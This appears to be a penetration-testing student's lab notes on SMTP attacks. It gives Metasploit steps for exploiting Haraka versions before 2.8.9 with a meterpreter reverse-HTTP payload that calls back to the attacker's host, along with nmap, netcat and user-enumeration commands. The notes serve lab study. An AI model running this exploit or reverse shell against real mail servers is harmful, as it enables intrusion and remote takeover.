```css
#_Haraka_SMTP_versions_prior_to_V2.8.9_vulnerable
```

```css
# SMTP Haraka 2.8.8
search libssh_auth_bypass

use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST <LOCAL_IP>
set LPORT 8080
run
# This is a NON-staged payload
```

```css
# SMTP
use exploit/linux/smtp/haraka
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_version
auxiliary/scanner/smtp/smtp_relay
```

```shell
sudo nmap -p 25 -sV -sC -O <TARGET_IP>

nmap -sV -script banner <TARGET_IP>
```

```shell
nc <TARGET_IP> 25
telnet <TARGET_IP> 25

# TELNET client - check supported capabilities
HELO attacker.xyz
EHLO attacker.xyz
```

```shell
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP> ($$$)
```

#### Metasploit

```shell
# METASPLOIT
service postgresql start && msfconsole -q

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

```

```
# SMTP
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_version
auxiliary/scanner/smtp/smtp_relay
```
![[Pasted image 20250914212045.png]]


![[Pasted image 20250914211912.png]]


![[Pasted image 20250914212614.png]]

